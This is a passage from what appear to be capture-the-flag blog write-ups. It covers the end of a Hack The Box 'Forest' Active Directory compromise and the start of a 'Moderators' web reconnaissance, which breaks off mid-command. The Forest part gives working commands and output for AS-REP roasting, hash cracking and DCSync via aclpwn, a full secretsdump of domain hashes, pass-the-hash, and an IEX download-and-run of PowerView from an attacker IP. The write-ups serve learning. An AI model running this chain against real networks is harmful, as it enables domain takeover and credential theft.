open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open http-rpc-epmap Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl 3268/tcp open globalcatLDAP Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49697/tcp open unknown 49902/tcp open unknown\nHost script results: |clock-skew: mean: 2h25m50s, deviation: 4h02m30s, median: 5m49s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local | System time: 2019-10-15T06:12:29-07:00 | smb-security-mode: | account_used:  | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-15T13:12:28 |_ start_date: 2019-10-15T03:25:51\nEnum with rpcclient root@p3:/opt# rpcclient -U “” -N 10.10.10.161 rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480]\nINTERESTING USERS: rpcclient $&gt; queryuser 0x47b (svc-alfresco) logon_count: 0x00000007 rpcclient $&gt; queryuser 0x479 (sebastien) logon_count: 0x00000008 rpcclient $&gt; queryuser 0x1f4 (Administrator) logon_count: 0x00000031\nEnumerate hashes for interesting users with Impacket tool GetNPUsers root@p3:/opt/impacket/examples# ./GetNPUsers.py htb.local/ -usersfile /opt/htb/machines/forest/users-forest.txt -format hashcat -dc-ip 10.10.10.161 -outputfile hash.txt root@p3:/opt/impacket/examples# cat hash.txt $krb5asrep\\(23\\)svc-alfresco@HTB.LOCAL:c6b386e4e646a26313188b25a9718d8f$df73ae7a0799b0763c99ebd9bae61f41354facff05b4cceb76ee4563009bf84db6640e6ebefea558fe9364c6fccb6eacb9f79acaf539ba7dffe13307d89b784c7ad16c838962d6256e27326834cfcc8389b782808bddec98a2685b535fd1d9257f22561507caaec13c6a319e5fe0d9980cf74355262fe3aa2f56a254ac0cf0031b5f61111c3c35adcd7cc4b8039bfc69210a60ed8fc4adb2d269911c33eab9f973e374f2b52ba68c452fbf961185d85ab8f9de7216cc4841474e1bbff324258c2df7bc91bb28bc51d164c5a3e6edc8b8c4da32258842f760c4548ea023b91f158eb483a35f09\nCrack the hash with hashcat root@p3:/opt/htb/machines/forest# hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked-hash.txt –force root@p3:/opt/htb/machines/forest# cat cracked-hash.txt $krb5asrep\\(23\\)svc-alfresco@HTB.LOCAL:c6b386e4e646a26313188b25a9718d8f$df73ae7a0799b0763c99ebd9bae61f41354facff05b4cceb76ee4563009bf84db6640e6ebefea558fe9364c6fccb6eacb9f79acaf539ba7dffe13307d89b784c7ad16c838962d6256e27326834cfcc8389b782808bddec98a2685b535fd1d9257f22561507caaec13c6a319e5fe0d9980cf74355262fe3aa2f56a254ac0cf0031b5f61111c3c35adcd7cc4b8039bfc69210a60ed8fc4adb2d269911c33eab9f973e374f2b52ba68c452fbf961185d85ab8f9de7216cc4841474e1bbff324258c2df7bc91bb28bc51d164c5a3e6edc8b8c4da32258842f760c4548ea023b91f158eb483a35f09:s3rvice\n# NOTE: User:Pass = svc-alfresco:s3rvice\nLogin using Evil-WinRM and found creds to grab user.txt root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice\nInfo: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint\nEvil-WinRM PS C:-alfresco&gt; cat ../Desktop/user.txt e5e4****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerate the DC environment using BloodHound. Evil-WinRM PS C:&gt; upload ../BloodHound/Ingestors/SharpHound.ps1 Evil-WinRM PS C:&gt; Import-module C:-alfresco.ps1 Evil-WinRM PS C:&gt; Get-Help Invoke-BloodHound Evil-WinRM PS C:&gt; Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Evil-WinRM PS C:&gt; download 20191024033946_BloodHound.zip\nStart neo4j console and bloodhoud, and import the zip by drag-and-drop it into the window. root@p3:/opt# neo4j console root@p3:/opt# bloodhound\n\nYou’ll find ‘Find Shortest Paths to Domain Admins’ to look something like this: svc-alfresco |– (MemberOf) –&gt; Group: Service Accounts |– (MemberOf) –&gt; Group: Privileged IT Accounts |– (MemberOf) –&gt; Group: Account Operators |– (GenericAll) –&gt; Group: Exchange Windows Permissions |– (WriteDacl) –&gt; HTB.LOCAL |– (Contains) –&gt; User: Administrator\n\nsvc-alfresco has the privs to create new users, or change passwords of users, in group Exchange Windows Permissions\n\n\n(indicated by the ‘MemberOf’-chain and GenericAll towards the Group)\n\n\nCreate a new user in the group Exchange Windows Permissions, to get closer to Administrator user.\n\nCreate new user in “Exchange Windows Permissions”-Group to pivot closer to Administrator Evil-WinRM PS C:&gt; net user p3 Password123! /add The command completed successfully.\nEvil-WinRM PS C:&gt; net group “exchange windows permissions” p3 /add /domain The command completed successfully.\nEvil-WinRM PS C:&gt; net localgroup “Remote Management Users” /add p3 The command completed successfully.\nroot@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.161 -u p3 -p Password123!\nInfo: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint\nEvil-WinRM PS C:&gt; whoami htb Evil-WinRM PS C:&gt; net user p3 /domain User name p3 Full Name Comment User’s comment Country/region code 000 (System Default) Account active Yes Account expires Never\nPassword last set 10/24/2019 5:14:48 AM Password expires 12/5/2019 5:14:48 AM Password changeable 10/25/2019 5:14:48 AM Password required Yes User may change password Yes\nWorkstations allowed All Logon script User profile Home directory Last logon Never\nLogon hours allowed All\nLocal Group Memberships Remote Management Use Global Group memberships Exchange Windows Perm*Domain Users &lt;———— The command completed successfully.\nGroup ‘Exchange Windows Permissions’ has WriteDacl to HTB.LOCAL which grants the ability to modify the DACL in the object security descriptor. Exploit this using aclpwn or PowerView: Add-DomainObjectAcl.\nNOTE: I was not able to get it to work with PowerView.\nroot@p3:/opt# aclpwn -f p3@htb.local -d htb.local -s 10.10.10.161 Please supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found! Path: (p3@HTB.LOCAL)-[MemberOf]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL) [-] Memberof -&gt; continue [-] Modifying domain DACL to give DCSync rights to p3 [+] Dacl modification successful [+] Finished running tasks [+] Saved restore state to aclpwn-20191024-171539.restore\nWith the new DCSync rights to user p3 we are able to extract hashes from the DC using Impacket tool secretsdump root@p3:/opt# impacket-secretsdump htb.local/p3@forest.htb.local -just-dc Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation\nPassword: [*] Dumping Domain Credentials (domain:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f::: htb.local9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44::: htb.local0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05::: htb.local670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a::: htb.local968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9::: htb.local6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555::: htb.local83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5::: htb.local:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff::: htb.local01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203::: htb.local7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355::: htb.local0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536::: htb.local:1145:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: htb.local:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: p3:7601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: FOREST\\(:1000:aad3b435b51404eeaad3b435b51404ee:be56ce6584d1219800617c9d1b58e8f5:::\nEXCH01\\):1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 htb.local3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4 htb.local3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e htb.local3d7722:des-cbc-md5:5dea94ef1c15c43e htb.local9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf htb.local9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd htb.local9daad:des-cbc-md5:7c8f0b6802e0236e htb.local0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e htb.local0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed htb.local0a90c9:des-cbc-md5:0bc8463273fed983 htb.local670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91 htb.local670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f htb.local670628e:des-cbc-md5:9bba8abad9b0d01a htb.local968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c htb.local968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8 htb.local968e74d:des-cbc-md5:68d5ae202af71c5d htb.local6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81 htb.local6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6 htb.local6ded678:des-cbc-md5:cbe9ce9d522c54d5 htb.local83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a htb.local83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2 htb.local83d6781:des-cbc-md5:8f43d073d0e9ec29 htb.local:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7 htb.local:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538 htb.local:des-cbc-md5:0bc8abe526753702 htb.local01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352 htb.local01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d htb.local01ac64:des-cbc-md5:97a13b7c7f40f701 htb.local7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd htb.local7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36 htb.local7108a4e:des-cbc-md5:a7ce0446ce31aefb htb.local0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c htb.local0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3 htb.local0659cc1:des-cbc-md5:e35b497a13628054 htb.local:aes256-cts-hmac-sha1-96:6f8ab2c7e297c3a11b31d0a3ba7e1118286008574182db0d90ef8bd8f96acd34 htb.local:aes128-cts-hmac-sha1-96:35f41fce714e9a624e25a6411069e869 htb.local:des-cbc-md5:529dc47a4cdcf1c2 htb.local:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local:des-cbc-md5:a13bb56bd043a2ce htb.local-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local-alfresco:des-cbc-md5:014ac86d0b98294a htb.local:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local:des-cbc-md5:a2ab5eef017fb9da htb.local:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local:des-cbc-md5:b5dff1f40b8f3be9 htb.local:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local:des-cbc-md5:4075ad528ab9e5fd p3:aes256-cts-hmac-sha1-96:ac3ab772908655869d3509d4c6d1e0d418d55b48e796548566640142ba18e224 p3:aes128-cts-hmac-sha1-96:eefda4ed27816b2235d24018e98b649c p3:des-cbc-md5:43da5ec26d7cf4f2 FOREST\\(:aes256-cts-hmac-sha1-96:6519e869415cad7deb8aa5dcfd89db611ee918200c2f8dbe0629f86b78f674dc\nFOREST\\):aes128-cts-hmac-sha1-96:b3ae4c5bada7d4eddc80fcebe409bc77 FOREST\\(:des-cbc-md5:c7e33bb334863e9d\nEXCH01\\):aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01\\(:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e\nEXCH01\\):des-cbc-md5:8c45f44c16975129 [*] Cleaning up…\n\n(OPTIONAL) Same can also be done using PowerView. Even though we get a lot of errors, the commands still go through and are successfull.\nEvil-WinRM PS C:&gt; IEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.3:8080/PowerView.ps1’) Cannot bind argument to parameter ‘Type’ because it is null. At line:20775 char:31 + lgrmi2_sidusage = field 1 $SID_NAME_USE + ~~~~~~~~~~~~~ + CategoryInfo : InvalidData: (:) [field], ParameterBindingValidationException + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,field Cannot bind argument to parameter ‘Type’ because it is null. At line:20808 char:21 + Flags = field 2 $DsDomainFlag + ~~~~~~~~~~~~~ + CategoryInfo : InvalidData: (:) [field], ParameterBindingValidationException + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,field\nEvil-WinRM PS C:&gt; Add-DomainObjectAcl -TargetIdentity “DC=htb,DC=local” -PrincipalIdentity p3 -Rights DCSync Exception calling “GetNames” with “1” argument(s): “Value cannot be null. Parameter name: enumType” At line:6564 char:9 + \\(UACValueNames = [Enum]::GetNames(\\)UACEnum) + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : ArgumentNullException Cannot validate argument on parameter ‘ValidateSet’. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again.\n\nAgain, use Impacket but this time pass-the-hash to get Administrator account and root flag root@p3:/opt/impacket/examples# python wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@forest.htb.local Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation\n[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:&gt;whoami htb\nC:&gt;type C:.txt f048****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nSIMILAR HTB BOX: Reel\n\nBloodHound 1.3 – The ACL Attack Path Update https://wald0.com/?p=112 WriteDACL: The ability to write a new ACE to the target object’s DACL. For example, an attacker may write a new ACE to the target object DACL giving the attacker “full control” of the target object. Abused with Add-NewADObjectAccessControlEntry.\nAn ACE Up the Sleeve https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf WriteDacl grants the ability to modify the DACL in the object security descriptor. Abusable with PowerView: Add-DomainObjectAcl\nBloodHound with Kali Linux: 101 https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nAttacking Active Directory Permissions with BloodHound https://blog.stealthbits.com/attacking-active-directory-permissions-with-bloodhound/\nACLPWN https://github.com/fox-it/aclpwn.py"
  },
  {
    "objectID": "posts/2022-09-05-htb-writeup-moderators/2022-09-05-htb-writeup-moderators.html",
    "href": "posts/2022-09-05-htb-writeup-moderators/2022-09-05-htb-writeup-moderators.html",
    "title": "Moderators - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\n➜  moderators nmap -Pn -n -p- 10.10.11.173\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n➜  moderators nmap -Pn -n -p22,80 -sCV 10.10.11.173\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)\n|   256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)\n|_  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Moderators\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n➜  webanalyze ./webanalyze -host http://10.10.11.173\nhttp://10.10.11.173 (0.2s):\n    Google Font API,  (Font scripts)\n    Font Awesome,  (Font scripts)\n    Bootstrap,  (UI frameworks)\n    Apache, 2.4.41 (Web servers)\n    Ubuntu,  (Operating systems)\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/FUZZ          \n.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 35ms]\n.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 38ms]\ncss                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 30ms]\nimages                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]\nlogs                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 32ms]\nserver-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 39ms]\n\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/FUZZ\ncss                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 61ms]\nuploads                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 47ms]\nOn port 80 we’re met with a very basic and ugly php page for the company Moderators.\n\nLooking around we find..\n.. three names and numbers in the footer - Jane, Holy and Fred .. on /about.php we find 6 users - Carl Benjamin, David Wall, Luna Harper, John Miller, Anthony Smith and Lexi Marie. .. blog.php contain vulnerability reports, mostly regarding sql injections. .. /reports.php?report=8121 contain a masked domain hinting that moderators.htb might have a subdomain. .. /reports.php?report=4221 nothing of use .. /reports.php?report=3478 nothing of use\nUse Burp Intruder to loop through 1-10000 on /reports.php?report= and we find three new pending reports: - /reports.php?report=2589 nothing of use - /reports.php?report=7612 nothing of use - /reports.php?report=9798 a path to logs - logs/e21cece511f43a5cb18d4932429915ed/\n➜  moderators curl -v http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/\n*   Trying 10.10.11.173:80...\n* Connected to moderators.htb (10.10.11.173) port 80 (#0)\n&gt; GET /logs/e21cece511f43a5cb18d4932429915ed/ HTTP/1.1\n&gt; Host: moderators.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 02 Sep 2022 11:54:32 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT\n&lt; ETag: \"0-5d1857dcad053\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 0\n&lt; Content-Type: text/html\n&lt; \nAfter fuzzing the directory for a while I find nothing. Instead we change focus and look on the url, and more specific e21cece511f43a5cb18d4932429915ed.\n➜  moderators echo -n \"e21cece511f43a5cb18d4932429915ed\" | wc -c\n32\n\n➜  moderators echo -n \"9798\" | md5sum\ne21cece511f43a5cb18d4932429915ed  -\nThe value is the md5sum of log id. Lets use this to see if there is any information we can grab from the other 5 reports.\n2589:\n➜  moderators echo -n \"2589\" | md5sum\n743c41a921516b04afde48bb48e28ce6  -\n➜  moderators curl -v http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/\n*   Trying 10.10.11.173:80...\n* Connected to moderators.htb (10.10.11.173) port 80 (#0)\n&gt; GET /logs/743c41a921516b04afde48bb48e28ce6/ HTTP/1.1\n&gt; Host: moderators.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 02 Sep 2022 12:06:08 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT\n&lt; ETag: \"0-5d1857dc68a76\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 0\n&lt; Content-Type: text/html\n&lt; \n* Connection #0 to host moderators.htb left intact\n3478:\n➜  moderators echo -n \"3478\" | md5sum                                         \nb071cfa81605a94ad80cfa2bbc747448  -\n➜  moderators curl -v http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/\n*   Trying 10.10.11.173:80...\n* Connected to moderators.htb (10.10.11.173) port 80 (#0)\n&gt; GET /logs/b071cfa81605a94ad80cfa2bbc747448/ HTTP/1.1\n&gt; Host: moderators.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 02 Sep 2022 12:07:05 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT\n&lt; ETag: \"0-5d1857dc89dc4\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 0\n&lt; Content-Type: text/html\n&lt; \n* Connection #0 to host moderators.htb left intact\n4221:\n➜  moderators echo -n \"4221\" | md5sum                                         \n74d90aafda34e6060f9e8433962d14fd  -\n➜  moderators curl -v http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/\n*   Trying 10.10.11.173:80...\n* Connected to moderators.htb (10.10.11.173) port 80 (#0)\n&gt; GET /logs/74d90aafda34e6060f9e8433962d14fd/ HTTP/1.1\n&gt; Host: moderators.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 02 Sep 2022 12:07:45 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT\n&lt; ETag: \"0-5d1857dc7365b\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 0\n&lt; Content-Type: text/html\n&lt; \n* Connection #0 to host moderators.htb left intact\n7612:\n➜  moderators echo -n \"7612\" | md5sum                                         